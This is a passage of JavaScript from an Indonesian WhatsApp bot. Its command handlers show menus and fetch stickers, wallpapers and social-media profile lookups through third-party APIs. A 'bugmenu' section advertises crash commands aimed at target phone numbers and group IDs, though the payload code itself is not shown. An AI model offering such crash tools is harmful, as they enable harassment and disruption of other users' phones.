anu = `Hay Kak ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu ??`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText: anu,
 locationMessage: {
 jpegThumbnail: buffer},
 hydratedFooterText: `${wm}`,
 hydratedButtons: [{  
 "urlButton": {
   "displayText": "Sc Bot",
   "url": "https://youtube.com/c/YosokaNesia"
 }
  },
  {
 "callButton": {
   "displayText": "Call Owner",
   "phoneNumber": "+6285891634201"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "Status Bot",
   "id": "ping"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "All Menu",
   "id": "allmenu",
 }
  },
  {
 "quickReplyButton": {
   "displayText": "YouTube",
   "id": "sc"
 }
  }
]
  }
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'soundbot': {
buffer = await getBuffer(`https://telegra.ph/file/5b6cf06c6c5dc1cc62e43.jpg`)
anu = `Hay Kak ${pushname} 👋 Selamat ${salam} 

╔─═⊱ *「 SOUND MENU 」* ─═⬣
│┏⊱
║⿻ Kal
│⿻ Ngakak
║⿻ Ketawa
│⿻ Awkwk
║⿻ Bang
│⿻ Nob
║⿻ Musik
│⿻ Mastah
║⿻ Slebew
│⿻ Cantik
║⿻ Kesel
│⿻ Ngeselin
║┗⊱
┗━━━━━━━━━━━━━━━━━━⬣`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText: anu,
 locationMessage: {
 jpegThumbnail: buffer},
 hydratedFooterText: `${wm}`,
 hydratedButtons: [{  
 "urlButton": {
   "displayText": "Sc Bot",
   "url": "https://youtube.com/c/YosokaNesia"
 }
  },
  {
 "callButton": {
   "displayText": "Call Owner",
   "phoneNumber": "+6285891634201"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "Status Bot",
   "id": "ping"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "All Menu",
   "id": "allmenu",
 }
  },
  {
 "quickReplyButton": {
   "displayText": "YouTube",
   "id": "sc"
 }
  }
]
  }
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'funnmenu': {
buffer = await getBuffer(`https://telegra.ph/file/5b6cf06c6c5dc1cc62e43.jpg`)
anu = `Hay Kak ${pushname} 👋 Selamat ${salam} 

╔─═⊱ *「 FUNN MENU 」* ─═⬣
│┏⊱
║⿻ Bagaimanakah
│⿻ Kapankah
║⿻ Apakah
│⿻ Bisakah
║⿻ Rate
│⿻ Wangy
║⿻ Gantengcek
│⿻ Cekganteng
║⿻ Cantikcek
│⿻ Cekcantik
║⿻ Sangecek
│⿻ Ceksange
║⿻ Gaycek
│⿻ Cekgay
║⿻ Lesbicek
│⿻ Styletext
║⿻ Halah
│⿻ Hilih
║⿻ Huluh
│⿻ Heleh
║⿻ Holoh
│⿻ Jadian
║⿻ Jodohku
│⿻ Delttt
║⿻ Family100
│⿻ Tebak [Option]
║⿻ Math [Mode]
│⿻ Suitpvp [@Tag]
║┗⊱
┗━━━━━━━━━━━━━━━━━━⬣`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText: anu,
 locationMessage: {
 jpegThumbnail: buffer},
 hydratedFooterText: `${wm}`,
 hydratedButtons: [{  
 "urlButton": {
   "displayText": "Sc Bot",
   "url": "https://youtube.com/c/YosokaNesia"
 }
  },
  {
 "callButton": {
   "displayText": "Call Owner",
   "phoneNumber": "+6285891634201"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "Status Bot",
   "id": "ping"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "All Menu",
   "id": "allmenu",
 }
  },
  {
 "quickReplyButton": {
   "displayText": "YouTube",
   "id": "sc"
 }
  }
]
  }
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'bugmenu': {
buffer = await getBuffer(`https://telegra.ph/file/5b6cf06c6c5dc1cc62e43.jpg`)
anu = `Hay Kak ${pushname} 👋 Selamat ${salam} 
╔─═─⊱ *「 BUG MENU 」* ─═─⬣
│┏⊱
║⿻ > m.chat (CEK ID GRUP)
│⿻ Bugtag [ Bug @ ]
║⿻ Crash [ Bug React ]
│⿻ Bugreacpc [ Nomor Target ]
║⿻ Vncrash [Nomor Target]
│⿻ Bugreacgc [Id Group]
║⿻ Bugsticker [ PC / GC ]
│⿻ Catalogc [ Crash Home ]
║⿻ Catalog+ [ Crash Home + IDR ]
│⿻ Catalog [ IDR ]
║⿻ Catalog2 [ PC  / GC ]
│⿻ Bugbutton [ New ]
║⿻ Virkonc [ 86 CTT ]
│⿻ Fotoc [ Nomor Target ]
║⿻ Pdfcrash [ Nomor Target ]
│⿻ Buglist [ New Md ]
║⿻ Virvidc [ Nomor Target ]
│⿻ Senbug [ Pilihan ]
║⿻ Bugvip [ Pilihan ]
│⿻ Jadibug1 [ Reply ]
║⿻ Jadibug2 [ Reply ]
│⿻ Jadibug3 [ Reply ]
║⿻ Jadibug4 [ Reply ]
│⿻ Jadibug5 [ Reply ]
║┗⊱
┗━━━━━━━━━━━━━━━━━━⬣

© CARA SEND Catalog2 & Bugsticker 

- SEND KE PC 62xx@s.whatsapp.net|1|1s
- SEND KE GC Id Gc@g.us|1|1s`
let btn = [{
urlButton: {
displayText: 'YouTube',
url: 'https://youtube.com/c/YosokaNesia'
}
}, {
callButton: {
displayText: 'Wa Owner',
phoneNumber: 'wa.me/+6285891634201'
}
}, {
quickReplyButton: {
displayText: 'Status Bot',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'All Menu',
id: 'allmenu'
}  
}, {
quickReplyButton: {
displayText: 'ꪶ𝒀𝑶𝑺𝑶𝑲𝑨𝑵𝑬𝑺𝑰𝑨🜏ꫂ',
id: 'sc'
 }
}]
 let setbot = db.data.settings[botNumber]
if (setbot.templateImage) {
haikal.send5ButImg(m.chat, anu, haikal.user.name, global.thumb, btn)
} else if (setbot.templateGif) {
haikal.send5ButGif(m.chat, anu, haikal.user.name, global.visoka, btn)
} else if (setbot.templateVideo) {
haikal.send5ButVid(m.chat, anu, haikal.user.name, global.visoka, btn)
} else if (setbot.templateMsg) {
haikal.send5ButMsg(m.chat, anu, haikal.user.name, btn)
}
}
break
//=================================================//
case 'primbonmenu': {
buffer = await getBuffer(`https://telegra.ph/file/5b6cf06c6c5dc1cc62e43.jpg`)
anu = `Hay Kak ${pushname} 👋 Selamat ${salam} 

╔─═⊱ *「 PRIMBON MENU 」* ─═⬣
│┏⊱
║⿻ Nomorhoki
│⿻ Artimimpi
║⿻ Artinama
│⿻ Ramaljodoh
║⿻ Ramalcinta
│⿻ Ramaljodohbali
║⿻ Suamiistri
│⿻ Cocoknama
║⿻ Pasangan
│⿻ Jadiannikah
║⿻ Sifatusaha
│⿻ Rezeki
║⿻ Pekerjaan
│⿻ Nasib
║⿻ Penyakit
│⿻ Tarot
║⿻ Fengshui
│⿻ Haribaik
║⿻ Harisangar
│⿻ Harisial
║⿻ Nagahari
│⿻ Arahrezeki
║⿻ Peruntungan
│⿻ Weton
║⿻ Karakter
│⿻ Keberuntungan
║⿻ Masasubur
│⿻ Memancing
║⿻ Zodiak
│⿻ Shio
║┗⊱
┗━━━━━━━━━━━━━━━━━━⬣`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText: anu,
 locationMessage: {
 jpegThumbnail: buffer},
 hydratedFooterText: `${wm}`,
 hydratedButtons: [{  
 "urlButton": {
   "displayText": "Sc Bot",
   "url": "https://youtube.com/c/YosokaNesia"
 }
  },
  {
 "callButton": {
   "displayText": "Call Owner",
   "phoneNumber": "+6285891634201"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "Status Bot",
   "id": "ping"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "All Menu",
   "id": "allmenu",
 }
  },
  {
 "quickReplyButton": {
   "displayText": "YouTube",
   "id": "sc"
 }
  }
]
  }
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'islamiyah': {
buffer = await getBuffer(`https://telegra.ph/file/5b6cf06c6c5dc1cc62e43.jpg`)
anu = `Hay Kak ${pushname} 👋 Selamat ${salam} 

╔─═⊱ *「 SOUND MENU 」* ─═⬣
│┏⊱
║⿻ iqra
│⿻ hadist
║⿻ alquran
│⿻ juzamma
║⿻ tafsirsurah
│┗⊱
┗━━━━━━━━━━━━━━━━━━⬣`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText: anu,
 locationMessage: {
 jpegThumbnail: buffer},
 hydratedFooterText: `${wm}`,
 hydratedButtons: [{  
 "urlButton": {
   "displayText": "Sc Bot",
   "url": "https://youtube.com/c/YosokaNesia."
 }
  },
  {
 "callButton": {
   "displayText": "Call Owner",
   "phoneNumber": "+6285891634201"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "Status Bot",
   "id": "ping"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "All Menu",
   "id": "allmenu",
 }
  },
  {
 "quickReplyButton": {
   "displayText": "YouTube",
   "id": "sc"
 }
  }
]
  }
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'beritanews': {
buffer = await getBuffer(`https://telegra.ph/file/5b6cf06c6c5dc1cc62e43.jpg`)
anu = `Hay Kak ${pushname} 👋 Selamat ${salam} 

╔─═⊱ *「 BERITA NEWS 」* ─═⬣
│┏⊱
║⿻ Merdeka-News
│⿻ Kontan-News
║⿻ Cnbc-News
│⿻ Tribun-News 
║⿻ Indozone-News 
│⿻ Kompas-News 
║⿻ Detik-News 
│⿻ Daily-News
║⿻ Inews-News 
│⿻ Okezone-News
║⿻ Sindo-News
│⿻ Tempo-News
║⿻ Antara-News
│⿻ Cnn-News 
║⿻ Fajar-News 
│┗⊱
┗━━━━━━━━━━━━━━━━━━⬣`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText: anu,
 locationMessage: {
 jpegThumbnail: buffer},
 hydratedFooterText: `${wm}`,
 hydratedButtons: [{  
 "urlButton": {
   "displayText": "Sc Bot",
   "url": "https://youtube.com/c/YosokaNesia"
 }
  },
  {
 "callButton": {
   "displayText": "Call Owner",
   "phoneNumber": "+6285891634201"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "Status Bot",
   "id": "ping"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "All Menu",
   "id": "allmenu",
 }
  },
  {
 "quickReplyButton": {
   "displayText": "YouTube",
   "id": "sc"
 }
  }
]
  }
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'groupmenu': {
buffer = await getBuffer(`https://telegra.ph/file/5b6cf06c6c5dc1cc62e43.jpg`)
anu = `Hay Kak ${pushname} 👋 Selamat ${salam} 

╔─═⊱ *「 GROUP MENU 」* ─═⬣
│┏⊱
║⿻ Linkgroup
│⿻ Ephemeral [Option]
║⿻ Setppgc [Image]
│⿻ Setname [Text]
║⿻ Setdesc [Text]
│⿻ Group [Option]
║⿻ Editinfo [Option]
│⿻ Add @User
║⿻ Kick @User
│⿻ Ban [Targer]
║⿻ Hidetag [Text]
│⿻ Tagall [Text]
║⿻ Antilink [On/off]
│⿻ Mute [On/off]
║⿻ Promote @User
│⿻ Demote @User
║⿻ Vote [Text]
│⿻ Devote
║⿻ Upvote
│⿻ Cekvote
║⿻ Hapusvote
┗━━━━━━━━━━━━━━━━━━⬣`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText: anu,
 locationMessage: {
 jpegThumbnail: buffer},
 hydratedFooterText: `${wm}`,
 hydratedButtons: [{  
 "urlButton": {
   "displayText": "Sc Bot",
   "url": "https://youtube.com/c/YosokaNesia"
 }
  },
  {
 "callButton": {
   "displayText": "Call Owner",
   "phoneNumber": "+6285891634201"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "Status Bot",
   "id": "ping"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "All Menu",
   "id": "allmenu",
 }
  },
  {
 "quickReplyButton": {
   "displayText": "YouTube",
   "id": "sc"
 }
  }
]
  }
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'ownermenu': {
buffer = await getBuffer(`https://telegra.ph/file/5b6cf06c6c5dc1cc62e43.jpg`)
anu = `Hay Kak ${pushname} 👋 Selamat ${salam} 

╔─═⊱ *「 OWNER MENU 」* ─═⬣
│┏⊱
║⿻ React [Emoji]
│⿻ Chat [Option]
║⿻ Join [Link]
│⿻ Leave
║⿻ Block @User
│⿻ Unblock @User
║⿻ Bcgroup [Text]
│⿻ Bcall [Text]
║⿻ Setppbot [Image]
│⿻ Setexif
║⿻ Setmenu [Option]
│⿻ Ping
║⿻ Owner
│⿻ Menu / Help / ?
║⿻ Delete
│⿻ Infochat
║⿻ Quoted
│⿻ Listpc
║⿻ Listgc
│⿻ Listonline
║⿻ Speedtest
┗━━━━━━━━━━━━━━━━━━⬣`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText: anu,
 locationMessage: {
 jpegThumbnail: buffer},
 hydratedFooterText: `${wm}`,
 hydratedButtons: [{  
 "urlButton": {
   "displayText": "Sc Bot",
   "url": "https://youtube.com/c/YosokaNesia"
 }
  },
  {
 "callButton": {
   "displayText": "Call Owner",
   "phoneNumber": "+6285891634201"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "Status Bot",
   "id": "ping"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "All Menu",
   "id": "allmenu",
 }
  },
  {
 "quickReplyButton": {
   "displayText": "YouTube",
   "id": "sc"
 }
  }
]
  }
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
// KHUSUS APIKEY KALAU MAU DI AKTIFKAN HUB : Wa.me/6281991410940
case 'freeapikey': {
buffer = await getBuffer(`https://telegra.ph/file/5b6cf06c6c5dc1cc62e43.jpg`)
anu = `Hay Kak ${pushname} 👋 Selamat ${salam} 

┏━━⊱ 

 semoji

 igstalk

 stalkgithub

 stalktwitter

 tiktokstalk

 mangatoon

 liriklagu

 imagetest

 cogan

 cecan

 quotemaker

 gaming

 pentol

 islami

 aesthetic

 anime

 drakjoke

 megumin

 yotsuba

 shinomiya

 yumeko

 tejina

 cyberspace

 chiho

 randomtextpro

 photooxy

 randomlogo

┗━━⊱
`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText: anu,
 locationMessage: {
 jpegThumbnail: buffer},
 hydratedFooterText: `${wm}`,
 hydratedButtons: [{  
 "urlButton": {
   "displayText": "Sc Bot",
   "url": "https://youtube.com/c/YosokaNesia"
 }
  },
  {
 "callButton": {
   "displayText": "Call Owner",
   "phoneNumber": "+6285891634201"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "Status Bot",
   "id": "ping"
 }
  },
  {
 "quickReplyButton": {
   "displayText": "All Menu",
   "id": "allmenu",
 }
  },
  {
 "quickReplyButton": {
   "displayText": "YouTube",
   "id": "sc"
 }
  }
]
  }
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break

//=================================================//
// KHUSUS APIKEY KALAU MAU DI AKTIFKAN HUB : Wa.me/6281991410940

case 'semoji': case 'emoji': case 'emoticon': {
if (isBan) throw mess.ban
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!text) throw `Example : ${prefix + command} 😱`  
anu = await fetchJson(`https://api.lolhuman.xyz/api/smoji3/${encodeURIComponent(text)}?apikey=${setting.lolkey}`)
haikal.sendImageAsSticker(m.chat, anu.result.emoji.whatsapp, m, { packname: global.packname, author: global.author }).catch((err) => bangkal(jsonformat('*Sorry there was an error*')))
  }
  break
//=================================================//
case 'igstalk': case 'instagramstalk': {
if (isBan) throw mess.ban
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!text) throw `*where is the Username ? example : ${prefix + command} moonsuten*`
if (!isInventoryLimit){ addInventoriLimit(m.sender) }
 if (isLimit < 1) return bangkal(mess.endLimit)
 kurangLimit(m.sender, 1)
 bangkal(`*1 limit used*`)
tod = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${text}?apikey=${setting.lolkey}`)
gaber = tod.result.photo_profile
teks = `
▊▊▊STALKER   ▊▊▊
▊▊▊INSTAGRAM ▊▊▊
*Data Successfully Obtained!*
▢ Username :  ${tod.result.username}
▢ Full Name : ${tod.result.fullname}
▢ Followers : ${tod.result.followers}
▢ Following : ${tod.result.following}
▢ total post : ${tod.result.posts}
▢ Bio : ${tod.result.bio}
`
var yaha = await getBuffer(gaber)
haikal.sendMessage(m.chat, { image: yaha, jpegThumbnail:yaha, caption: `${teks}` }, { quoted: hw }).catch((err) => bangkal('*Username Not found*'))
}
break
//=================================================//
case 'stalkgithub': case 'githubstalk': {
if (isBan) throw mess.ban
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
   if (!text) throw `*Example : ${prefix + command} zim-bot*`
   ini_result = await fetchJson(`https://api-riychdwayne.herokuapp.com/api/githubstalk?username=${text}&apikey=${setting.riy}`)
   ini_result = ini_result.result  
   ini_txt = `
▊▊▊STALKER ▊▊▊
▊▊▊GITHUB   ▊▊▊

*Data Successfully Obtained!*
\`\`\`📫 AVATAR : ${ini_result.avatar}\`\`\`
\`\`\`🎞 PUBLIC REPO : ${ini_result.public_repo}\`\`\`
\`\`\`📟 PUBLIC GISTS : ${ini_result.public_gists}\`\`\`
\`\`\`📮 FOLLOWERS : ${ini_result.follower}\`\`\`
\`\`\`📚 FOLLOWING : ${ini_result.following}\`\`\`
\`\`\`📻 BIO : ${ini_result.bio}\`\`\`
\`\`\`🗃️ EMAIL : ${ini_result.email}\`\`\`
\`\`\`🗃️ LOCATION : ${ini_result.location}\`\`\`
\`\`\`🗃️ TWITTER : ${ini_result.twiter_username}\`\`\`
`
haikal.sendImage(m.chat, ini_result.avatar, `${ini_txt}`, m).catch((err) => bangkal('*Username Not found*'))
}
break
 //=================================================//
case 'stalktwitter': case 'twitterstalk': {
if (isBan) throw mess.ban
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
 if (!text) throw `Example : ${prefix + command} wibu.xyz`
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/twitter/${text}?apikey=${setting.lolkey}`)
  get_result = get_result.result 
  pp_tt = await getBuffer(get_result.profile_picture)
  ini_txt = `
*▊▊▊TWITTER STALK ▊▊▊*

*Data Successfully Obtained!*
\`\`\`📫 Username : ${get_result.screen_name}\`\`\`
\`\`\`🎞 NAME : ${get_result.name}\`\`\`
\`\`\`📟 DESCRITION : ${get_result.description}\`\`\`
\`\`\`📮 FOLLOWERS : ${get_result.followers}\`\`\`
\`\`\`📚 FOLLOWING : ${get_result.following}\`\`\`
\`\`\`📻 TWEET : ${get_result.tweet}\`\`\`
\`\`\`🗃️ JOINED : ${get_result.joined}\`\`\`
`
haikal.sendImage(m.chat, get_result.profile_picture, `${ini_txt}`, m).catch((err) => bangkal('*Username Not found*'))
}
break
//=================================================//
case 'tiktokstalk': {
if (isBan) throw mess.ban
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
  if (!text) throw `Example : ${prefix + command} wibu.xyz`
  get_result = await fetchJson(`http://api.lolhuman.xyz/api/stalktiktok/${text}?apikey=${setting.lolkey}`)
  get_result = get_result.result  
  ini_txt = `
*▊▊▊TIKTOK STALK ▊▊▊*

*Data Successfully Obtained!*
\`\`\`📫 Username : ${get_result.username}\`\`\`
\`\`\`🎞 NAME : ${get_result.nickname}\`\`\`
\`\`\`📟 FOLOWERS : ${get_result.followers}\`\`\`
\`\`\`📮 FOLLOWING : ${get_result.followings}\`\`\`
\`\`\`📚 LIKES : ${get_result.likes}\`\`\`
\`\`\`📻 VIDEO : ${get_result.video}\`\`\`
\`\`\`🗃️ DESCRIPTION : ${get_result.bio}\`\`\`
`
haikal.sendImage(m.chat, get_result.user_picture, `${ini_txt}`, m).catch((err) => bangkal('*Username Not found*'))
}
break  
//=================================================//
case 'mangatoon': {
if (isBan) throw mess.ban
if (!text) throw `what are you looking for!, example : ${prefix + command} config_internet`
let anu = await fetchJson(`https://violetics.pw/api/search/mangatoon?apikey=${setting.violkey}&query=${text}`)
bangkal(`${util.format(anu)}`)
}
 break
//=================================================//
case 'lyrics': case 'lirik': case 'liriklagu': {
if (isBan) throw mess.ban
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!text) throw `Example : ${prefix + command} Kemarin`
anu = await fetchJson(`https://api.lolhuman.xyz/api/lirik?apikey=${setting.lolkey}&query=${text}`)
bangkal(`${anu.result}`)
 }
 break
//=================================================//
  case 'imagetest': {
if (isBan) throw mess.ban
	 if (!/image/.test(mime)) throw `
*Send/Reply Image With Caption* ${prefix + command}
┏━━⊱ 
 angie
 aria
 attic
 blackandwhite
 chorme1977
 constrastbandw
 creamy
 duotone
 eva
 goldenhour
 hana
 lana
 lavander
 lemonande
 lightleak
 lisa
 lomo
 milk
 molly
 monochrome
 morning
 movie
 orton
 perfectbandw
 plumy
 retrolga
 ruby
 sand
 sapphire
 sepia
 softsepia
 solarize
 sphinx
 venus
 viewfinder
 warmsunset
┗━━⊱`
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
let buf = await getBuffer(`https://violetics.pw/api/photofilter/${command}?apikey=${setting.violkey}&image=${anu}`)
haikal.sendMessage(m.chat, { image: buf, jpegThumbnail:buf, caption: `PhotoFilter ${command}` }, { quoted: hw}).catch ((err) => bangkal('*Sorry failed to create a filter*'))
}
break
//=================================================//
case 'cogan': {
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/cogan2?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'cecan': {
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/cecan2?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
 break
//=================================================//
case 'quotemaker': {
if (isBan) throw mess.ban
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!text) throw 'should use text example: .quotemaker I just love you'
anu = await getBuffer(`https://xteam.xyz/quotemaker?text=${text}&wm=stars&APIKEY=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'gaming': {
if (isBan) throw mess.ban
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/gaming?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'pentol': {
if (isBan) throw mess.ban
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/pentol?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'islami': {
if (isBan) throw mess.ban
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/islami?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'aesthetic': {
if (isBan) throw mess.ban
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/aesthetic?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'anime': {
if (isBan) throw mess.ban
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
bangkal(mess.wait)
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/anime?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'drakjoke': case 'darkjoke': {
if (isBan) throw mess.ban   
anu = await getBuffer(`https://xteam.xyz/randomimage/drak?APIKEY=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'megumin': {
if (isBan) throw mess.ban
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/megumin?apikey=${setting.riy}`)
haikal.sendMessag0 (m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'yotsuba': {
if (isBan) throw mess.ban
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/yotsuba?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'shinomiya': {
if (isBan) throw mess.ban
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/shinomiya?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'yumeko': {
if (isBan) throw mess.ban
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/yumeko?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'tejina': {
if (isBan) throw mess.ban
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/tejina?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
  case 'cyberspace': {
if (isBan) throw mess.ban
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/cyberspace?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
break
//=================================================//
case 'chiho': {
if (isBan) throw mess.ban
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/wallpaper/chiho?apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, jpegThumbnail:anu, caption: `*${command}*` }, { quoted: hw }).catch ((err) => bangkal('*Sorry for the feature error*'))
}
 break
//=================================================//
 case 'randomtextpro': {
 if (isBan) throw mess.ban
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!text) throw `

Example : ${prefix + command} text
brokenglass
neonlight
blackpink
hallowen
artpapper
magma
glossy
grafitytext
watercolor
multicolor
neondevil
skytext
vintage
writing
gluetext
holograpic
deluxesilver
fabric
wicker
larva
toxic
koi
bread
hororblood
honey
ice
rusty
christmas
gradien
dropwater
harrypotter
3dstone
1917
thunder2
stroberi
blood
jokerlogo

`
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/textpro/${command}?text=${text}&apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, caption: `Text Pro ${command}` }, { quoted: hw}).catch((err) => bangkal('*Sorry Xteam server is down*'))
	 }
break
//=================================================//
 case 'randomlogo': {
 if (isBan) throw mess.ban
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!text) throw `

Example : ${prefix + command} text
marvellogo2
lionlogo
pornhub
avengerslogo
ninjalogo
grafitytext2
astone
space
logowolf2
logowolf
captain`
anu = await getBuffer(`https://api-riychdwayne.herokuapp.com/api/textpro/${command}?text=${text}&text2=.&apikey=${setting.riy}`)
haikal.sendMessage(m.chat, { image: anu, caption: `Text Pro ${command}` }, { quoted: hw}).catch((err) => bangkal('*Sorry Xteam server is down*'))
	 }
break
//=================================================//
case 'photooxy': {
if (isBan) throw mess.ban
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!text) throw `

Example : ${prefix + command} text
silk
3dnature
bevel
birthdaycake
burnpaper
coffee
